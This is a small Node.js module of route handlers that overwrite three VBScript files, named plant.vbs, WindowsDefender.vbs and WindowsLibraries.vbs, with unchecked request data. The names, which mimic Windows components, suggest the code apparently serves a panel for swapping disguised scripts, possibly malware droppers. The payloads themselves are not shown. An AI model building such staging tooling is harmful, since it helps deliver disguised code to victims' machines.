const path = require("path")
const { hasAccess } = require("./src/Auth/Middlewares")
const fs = require("fs")



    function EditPlantRoute(req, res) {

        console.log("Overriting plant.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the plant.vbs file exists
        if (fs.existsSync(path.join(__dirname, "ProductionResources", "plant.vbs")) == false)
            return res.json({
                success: false,
                message: "The plant.vbs file does not exist"
            })

        //override the plant.vbs file with this data 
        fs.writeFileSync(path.join(__dirname, "ProductionResources", "plant.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the plant.vbs file"
        })
    }

    function EditWindowsDefenderRoute(req, res) {

        console.log("Overriting WindowsDefender.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the WindowsDefender.vbs file exists
        if (fs.existsSync(path.join(__dirname, "ProductionResources", "WindowsDefender.vbs")) == false)
            return res.json({
                success: false,
                message: "The WindowsDefender.vbs file does not exist"
            })

        //override the WindowsDefender.vbs file with this data 
        fs.writeFileSync(path.join(__dirname, "ProductionResources", "WindowsDefender.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the WindowsDefender.vbs file"
        })
    }

    function EditWindowsLibraries(req, res) {

        console.log("Overriting WindowsLibraries.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the WindowsLibraries.vbs file exists
        if (fs.existsSync(path.join(__dirname, "ProductionResources", "WindowsLibraries.vbs")) == false)
            return res.json({
                success: false,
                message: "The WindowsLibraries.vbs file does not exist"
            })

        //override the WindowsLibraries.vbs file with this data
        fs.writeFileSync(path.join(__dirname, "ProductionResources", "WindowsLibraries.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the WindowsLibraries.vbs file"
        })

    }

module.exports = { EditPlantRoute, EditWindowsDefenderRoute, EditWindowsLibraries }